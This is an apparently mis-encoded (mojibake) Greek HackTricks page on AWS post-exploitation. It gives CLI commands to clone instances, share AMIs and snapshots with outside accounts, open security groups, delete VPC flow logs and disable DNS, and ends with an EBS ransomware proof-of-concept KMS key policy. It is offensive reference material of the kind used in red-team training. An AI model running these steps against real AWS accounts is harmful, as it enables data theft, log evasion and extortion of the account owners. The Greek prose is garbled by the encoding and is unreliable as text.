# AWS - EC2, EBS, SSM & VPC ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

## EC2 & VPC

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/" %}
[aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/)
{% endcontent-ref %}

### **ÎšÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï‚ ÎšÎ±Î¸ÏÎ­Ï€Ï„Î·Ï‚ VPC -** `ec2:DescribeInstances`, `ec2:RunInstances`, `ec2:CreateSecurityGroup`, `ec2:AuthorizeSecurityGroupIngress`, `ec2:CreateTrafficMirrorTarget`, `ec2:CreateTrafficMirrorSession`, `ec2:CreateTrafficMirrorFilter`, `ec2:CreateTrafficMirrorFilterRule`

ÎŸ ÎºÎ±Î¸ÏÎ­Ï€Ï„Î·Ï‚ ÎºÎ¯Î½Î·ÏƒÎ·Ï‚ VPC **Î´Î¹Ï€Î»Î±ÏƒÎ¹Î¬Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÎ¹ÏƒÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· ÎºÎ±Î¹ ÎµÎ¾ÎµÏÏ‡ÏŒÎ¼ÎµÎ½Î· ÎºÎ¯Î½Î·ÏƒÎ· Î³Î¹Î± Ï„Î¹Ï‚ EC2 Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÎµÎ½Ï„ÏŒÏ‚ Î¼Î¹Î±Ï‚ VPC** Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ Î±Î½Î¬Î³ÎºÎ· Î½Î± ÎµÎ³ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎµÏ„Îµ Î¿Ï„Î¹Î´Î®Ï€Î¿Ï„Îµ ÏƒÏ„Î¹Ï‚ Î¯Î´Î¹ÎµÏ‚ Ï„Î¹Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚. Î‘Ï…Ï„Î® Î· Î´Î¹Ï€Î»Î±ÏƒÎ¹Î±ÏƒÎ¼Î­Î½Î· ÎºÎ¯Î½Î·ÏƒÎ· Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î½Î± ÏƒÏ„Î±Î»ÎµÎ¯ ÏƒÎµ ÎºÎ¬Ï„Î¹ ÏŒÏ€Ï‰Ï‚ Î­Î½Î± ÏƒÏÏƒÏ„Î·Î¼Î± Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·Ï‚ Î´Î¹ÎµÎ¯ÏƒÎ´Ï…ÏƒÎ·Ï‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… (IDS) Î³Î¹Î± Î±Î½Î¬Î»Ï…ÏƒÎ· ÎºÎ±Î¹ Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿ÏÎ¸Î·ÏƒÎ·.\
ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ ÏŒÎ»Î· Ï„Î·Î½ ÎºÎ¯Î½Î·ÏƒÎ· ÎºÎ±Î¹ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î®Î½:

Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md" %}
[aws-malicious-vpc-mirror.md](../../../aws-security/aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/aws-malicious-vpc-mirror.md)
{% endcontent-ref %}

### Î‘Î½Ï„Î¹Î³ÏÎ±Ï†Î® Î•ÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î·Ï‚ Î ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·Ï‚

ÎŸÎ¹ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ ÎºÎ¬Ï€Î¿Î¹Î¿Ï… ÎµÎ¯Î´Î¿Ï…Ï‚ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚. Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î´Î¹Î¬Ï†Î¿ÏÎ¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Î¼Ï€ÎµÎ¯Ï„Îµ Î¼Î­ÏƒÎ± (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [ÎºÏŒÎ»Ï€Î± Î±Î½ÏŒÎ´Î¿Ï… Ï€ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½ EC2](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md)). Î©ÏƒÏ„ÏŒÏƒÎ¿, Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Ï„Î¹ Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ ÎµÎ¯Î½Î±Î¹ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± AMI ÎºÎ±Î¹ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± Î½Î­Î± Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· (Î±ÎºÏŒÎ¼Î± ÎºÎ±Î¹ ÏƒÏ„Î¿Î½ Î´Î¹ÎºÏŒ ÏƒÎ±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ) Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ**:
```shell
# List instances
aws ec2 describe-images

# create a new image for the instance-id
aws ec2 create-image --instance-id i-0438b003d81cd7ec5 --name "AWS Audit" --description "Export AMI" --region eu-west-1

# add key to AWS
aws ec2 import-key-pair --key-name "AWS Audit" --public-key-material file://~/.ssh/id_rsa.pub --region eu-west-1

# create ec2 using the previously created AMI, use the same security group and subnet to connect easily.
aws ec2 run-instances --image-id ami-0b77e2d906b00202d --security-group-ids "sg-6d0d7f01" --subnet-id subnet-9eb001ea --count 1 --instance-type t2.micro --key-name "AWS Audit" --query "Instances[0].InstanceId" --region eu-west-1

# now you can check the instance
aws ec2 describe-instances --instance-ids i-0546910a0c18725a1

# If needed : edit groups
aws ec2 modify-instance-attribute --instance-id "i-0546910a0c18725a1" --groups "sg-6d0d7f01"  --region eu-west-1

# be a good guy, clean our instance to avoid any useless cost
aws ec2 stop-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
aws ec2 terminate-instances --instance-id "i-0546910a0c18725a1" --region eu-west-1
```
### EBS Î‘Î½Ï„Î¹Î³ÏÎ±Ï†Î® Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚

**ÎŸÎ¹ Î±Î½Ï„Î¹Î³ÏÎ±Ï†Î­Ï‚ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ (snapshots) ÎµÎ¯Î½Î±Î¹ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î± Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚ Ï„Ï‰Î½ ÏŒÎ³ÎºÏ‰Î½**, Ï„Î± Î¿Ï€Î¿Î¯Î± ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ **ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**, Î³Î¹Î± Î±Ï…Ï„ÏŒ Î· Î­Î»ÎµÎ³Ï‡ÏŒÏ‚ Ï„Î¿Ï…Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚.\
Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ Î­Î½Î±Î½ **ÏŒÎ³ÎºÎ¿ Ï‡Ï‰ÏÎ¯Ï‚ Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ: **Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± Î±Î½Ï„Î¯Î³ÏÎ±Ï†Î¿ Î±ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚** ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î® Î±Ï€Î»Î¬ **Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÏƒÎµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ:

{% content-ref url="../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md" %}
[aws-ebs-snapshot-dump.md](../../../aws-security/aws-post-exploitation/aws-ec2-ebs-ssm-and-vpc-post-exploitation/aws-ebs-snapshot-dump.md)
{% endcontent-ref %}

### Î•Î¾Î±Î³Ï‰Î³Î® Î”ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½

#### Î•Î¾Î±Î³Ï‰Î³Î® Î¼Î­ÏƒÏ‰ DNS

Î‘ÎºÏŒÎ¼Î± ÎºÎ¹ Î±Î½ Î­Ï‡ÎµÏ„Îµ Ï€ÎµÏÎ¹Î¿ÏÎ¯ÏƒÎµÎ¹ Î­Î½Î± EC2 ÏÏƒÏ„Îµ Î½Î± Î¼Î·Î½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¾Î­Î»Î¸ÎµÎ¹ ÎºÎ¯Î½Î·ÏƒÎ·, Î¼Ï€Î¿ÏÎµÎ¯ Î±ÎºÏŒÎ¼Î± Î½Î± **ÎµÎ¾Î¬Î³ÎµÎ¹ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î¼Î­ÏƒÏ‰ DNS**.

* **Î¤Î± VPC Flow Logs Î´ÎµÎ½ Î¸Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î½ Î±Ï…Ï„ÏŒ**.
* Î”ÎµÎ½ Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ DNS Ï„Î·Ï‚ AWS.
*   Î‘Ï€ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Î±Ï…Ï„ÏŒ Î¿ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿ "enableDnsSupport" ÏƒÎµ false Î¼Îµ:

`aws ec2 modify-vpc-attribute --no-enable-dns-support --vpc-id <vpc-id>`

#### Î•Î¾Î±Î³Ï‰Î³Î® Î¼Î­ÏƒÏ‰ ÎºÎ»Î®ÏƒÎµÏ‰Î½ API

ÎˆÎ½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Î»Î­ÏƒÎµÎ¹ Ï„Î± ÏƒÎ·Î¼ÎµÎ¯Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ·Ï‚ Ï„Ï‰Î½ ÎºÎ»Î®ÏƒÎµÏ‰Î½ API ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï€Î¿Ï… ÎµÎ»Î­Î³Ï‡ÎµÎ¹. Î¤Î¿ Cloudtrail Î¸Î± ÎºÎ±Ï„Î±Î³ÏÎ¬ÏˆÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎºÎ»Î®ÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´ÎµÎ¹ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï€Î¿Ï… ÎµÎ¾Î¬Î³Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î± Î±ÏÏ‡ÎµÎ¯Î± ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ Ï„Î¿Ï… Cloudtrail.

### Î‘Î½Î¿Î¹Ï‡Ï„Î® ÎŸÎ¼Î¬Î´Î± Î‘ÏƒÏ†Î±Î»ÎµÎ¯Î±Ï‚

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÎµÏÎ±Î¹Ï„Î­ÏÏ‰ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ Î´Î¹ÎºÏ„ÏÎ¿Ï… Î±Î½Î¿Î¯Î³Î¿Î½Ï„Î±Ï‚ Î¸ÏÏÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„Î­Ï‚:

{% code overflow="wrap" %}
```bash
aws ec2 authorize-security-group-ingress --group-id <sg-id> --protocol tcp --port 80 --cidr 0.0.0.0/0
# Or you could just open it to more specific ips or maybe th einternal network if you have already compromised an EC2 in the VPC
```
{% endcode %}

### Î‘Î½Î­Î²Î±ÏƒÎ¼Î± Î´Î¹ÎºÎ±Î¹Ï‰Î¼Î¬Ï„Ï‰Î½ ÏƒÏ„Î¿ ECS

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Î¼Î¹Î± EC2 Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· ÎºÎ±Î¹ Î½Î± Ï„Î·Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÏ‰Î½ ECS ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Ï‰Î½ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÏ‰Î½ ECS.

Î“Î¹Î± [**Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„ÏŒ**](../../../aws-security/aws-privilege-escalation/aws-ec2-privesc.md#privesc-to-ecs).

### Î‘Ï†Î±Î¯ÏÎµÏƒÎ· ÎºÎ±Ï„Î±Î³ÏÎ±Ï†Î®Ï‚ ÏÎ¿Î®Ï‚ VPC
```bash
aws ec2 delete-flow-logs --flow-log-ids <flow_log_ids> --region <region>
```
### ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· AMI

{% code overflow="wrap" %}
```bash
aws ec2 modify-image-attribute --image-id <image_ID> --launch-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
### ÎšÎ¿Î¹Î½Î¿Ï€Î¿Î¯Î·ÏƒÎ· EBS Snapshot

{% code overflow="wrap" %}
```bash
aws ec2 modify-snapshot-attribute --snapshot-id <snapshot_ID> --create-volume-permission "Add=[{UserId=<recipient_account_ID>}]" --region <AWS_region>
```
{% endcode %}

### EBS Ransomware PoC

ÎˆÎ½Î± proof of concept Ï€Î±ÏÏŒÎ¼Î¿Î¹Î¿ Î¼Îµ Ï„Î·Î½ ÎµÏ€Î¯Î´ÎµÎ¹Î¾Î· Ï„Î¿Ï… Ransomware Ï€Î¿Ï… Ï€Î±ÏÎ¿Ï…ÏƒÎ¹Î¬ÏƒÏ„Î·ÎºÎµ ÏƒÏ„Î¹Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÎµÎ¹Ï‚ post-exploitation Ï„Î¿Ï… S3. Î¤Î¿ KMS Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î¼ÎµÏ„Î¿Î½Î¿Î¼Î±ÏƒÏ„ÎµÎ¯ ÏƒÎµ RMS Î³Î¹Î± Ransomware Management Service, Î¼Îµ Ï„Î¿Î½ Ï„ÏÏŒÏ€Î¿ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„ÏŒÏƒÎ¿ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· Î´Î¹Î¬Ï†Î¿ÏÏ‰Î½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ Ï„Î¿Ï… AWS.

Î ÏÏÏ„Î±, Î±Ï€ÏŒ Î­Î½Î±Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS 'ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…', Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î±Î½ Ï€ÎµÎ»Î¬Ï„Î· Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹Î¶ÏŒÎ¼ÎµÎ½Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ ÏƒÏ„Î¿ KMS. Î“Î¹Î± Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î±Ï€Î»Î¬ Î¸Î± Î±Ï†Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¿ AWS Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î³Î¹Î± ÎµÎ¼Î­Î½Î±, Î±Î»Î»Î¬ ÏƒÎµ Î­Î½Î± ÏÎµÎ±Î»Î¹ÏƒÏ„Î¹ÎºÏŒ ÏƒÎµÎ½Î¬ÏÎ¹Î¿, Î­Î½Î±Ï‚ ÎºÎ±ÎºÏŒÎ²Î¿Ï…Î»Î¿Ï‚ Î´ÏÎ¬ÏƒÏ„Î·Ï‚ Î¸Î± ÎºÏÎ±Ï„Î¿ÏÏƒÎµ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï ÎµÎºÏ„ÏŒÏ‚ ÎµÎ»Î­Î³Ï‡Î¿Ï… Ï„Î¿Ï… AWS. Î‘Î»Î»Î¬Î¾Ï„Îµ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® Ï„Î¿Ï… ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î½Î´Î®Ï€Î¿Ï„Îµ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ AWS Principal Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯. Î“Î¹Î± Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ® ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï, Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î®Ï„Î±Î½ 'AttackSim' ÎºÎ±Î¹ Î¿ ÎºÎ±Î½ÏŒÎ½Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ ÏŒÎ»Î· Ï„Î·Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¿Î½Î¿Î¼Î¬Î¶ÎµÏ„Î±Î¹ 'Outside Encryption'.
```
{
"Version": "2012-10-17",
"Id": "key-consolepolicy-3",
"Statement": [
{
"Sid": "Enable IAM User Permissions",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:root"
},
"Action": "kms:*",
"Resource": "*"
},
{
"Sid": "Allow access for Key Administrators",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Create*",
"kms:Describe*",
"kms:Enable*",
"kms:List*",
"kms:Put*",
"kms:Update*",
"kms:Revoke*",
"kms:Disable*",
"kms:Get*",
"kms:Delete*",
"kms:TagResource",
"kms:UntagResource",
"kms:ScheduleKeyDeletion",
"kms:CancelKeyDeletion"
],
"Resource": "*"
},
{
"Sid": "Allow use of the key",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey"
],
"Resource": "*"
},
{
"Sid": "Outside Encryption",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"kms:Encrypt",
"kms:Decrypt",
"kms:ReEncrypt*",
"kms:GenerateDataKey*",
"kms:DescribeKey",
"kms:GenerateDataKeyWithoutPlainText",
"kms:CreateGrant"
],
"Resource": "*"
},
{
"Sid": "Allow attachment of persistent resources",
"Effect": "Allow",
"Principal": {
"AWS": "arn:aws:iam::[Your AWS Account Id]:user/AttackSim"
},
"Action": [
"kms:CreateGrant",
"kms:ListGrants",
"kms:RevokeGrant"
],
"Resource": "*",
"Condition": {
"Bool": {
"kms:GrantIsForAWSResource": "true"
}
}
}
]
}
```
ÎŸ ÎºÎ±Î½ÏŒÎ½Î±Ï‚ Ï€Î¿Î»Î¹Ï„Î¹ÎºÎ®Ï‚ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î± Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± Î³Î¹Î± Î½Î± ÎµÏ€Î¹Ï„ÏÎ±Ï€ÎµÎ¯ Î· Î´Ï…Î½Î±Ï„ÏŒÏ„Î·Ï„Î± Ï‡ÏÎ®ÏƒÎ·Ï‚ Ï„Î¿Ï… Î³Î¹Î± Ï„Î·Î½ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ¬Ï†Î·ÏƒÎ· ÎµÎ½ÏŒÏ‚ EBS ÏŒÎ³ÎºÎ¿Ï…:

* `kms:CreateGrant`
* `kms:Decrypt`
* `kms:DescribeKey`
* `kms:GenerateDataKeyWithoutPlainText`
* `kms:ReEncrypt`

